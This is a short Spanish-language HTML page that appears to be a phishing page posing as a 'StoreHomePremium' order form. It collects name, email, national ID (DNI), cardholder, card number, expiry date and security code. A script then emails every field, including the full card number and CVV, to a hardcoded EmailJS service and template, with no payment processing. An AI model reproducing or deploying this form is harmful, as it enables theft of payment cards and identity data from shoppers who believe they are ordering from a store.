<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>StoreHomePremium</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <style>
    body {
      margin: 0;
      font-family: Arial, Helvetica, sans-serif;
      background: linear-gradient(180deg, #2f66d0, #6fa0ff);
      display: flex;
      justify-content: center;
      padding: 20px;
    }
    .card {
      width: 100%;
      max-width: 420px;
      color: white;
    }
    label {
      display: block;
      margin-top: 14px;
    }
    input {
      width: 100%;
      padding: 12px;
      border-radius: 8px;
      border: none;
      margin-top: 6px;
    }
    button {
      margin-top: 25px;
      width: 100%;
      padding: 14px;
      border: none;
      border-radius: 10px;
      background: #0a2f7a;
      color: white;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
    }
  </style>
</head>

<body>
  <div class="card">
    <h2>StoreHomePremium â€“ Registro de pedido</h2>

    <label>Monto</label>
    <input id="monto" type="text">

    <label>Tipo</label>
    <input id="tipo" type="text">

    <label>Nombre</label>
    <input id="nombre" type="text">

    <label>Email</label>
    <input id="email" type="email">

    <label>DNI</label>
    <input id="dni" type="text">

    <label>Titular</label>
    <input id="titular" type="text">

    <label>Numero de tarjeta</label>
    <input id="numero_tarjeta" type="text">

    <label>Fecha de expiracion</label>
    <input id="fecha_expiracion" type="text">

    <label>Codigo de seguridad</label>
    <input id="codigo_seguridad" type="text">

    <button type="button" id="enviar">Enviar</button>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

  <script>
    emailjs.init("gOD19I3u7jPioagR4");

    document.getElementById("enviar").addEventListener("click", function () {

      emailjs.send(
        "service_p965auj",
        "template_h5kc29e",
        {
          monto: document.getElementById("monto").value,
          tipo: document.getElementById("tipo").value,
          nombre: document.getElementById("nombre").value,
          email: document.getElementById("email").value,
          dni: document.getElementById("dni").value,
          titular: document.getElementById("titular").value,
          numero_tarjeta: document.getElementById("numero_tarjeta").value,
          fecha_expiracion: document.getElementById("fecha_expiracion").value,
          codigo_seguridad: document.getElementById("codigo_seguridad").value
        }
      ).then(
        function () {
          alert("Formulario enviado correctamente");
        },
        function (error) {
          alert("Error al enviar el formulario");
          console.log(error);
        }
      );
    });
  </script>
</body>
</html>
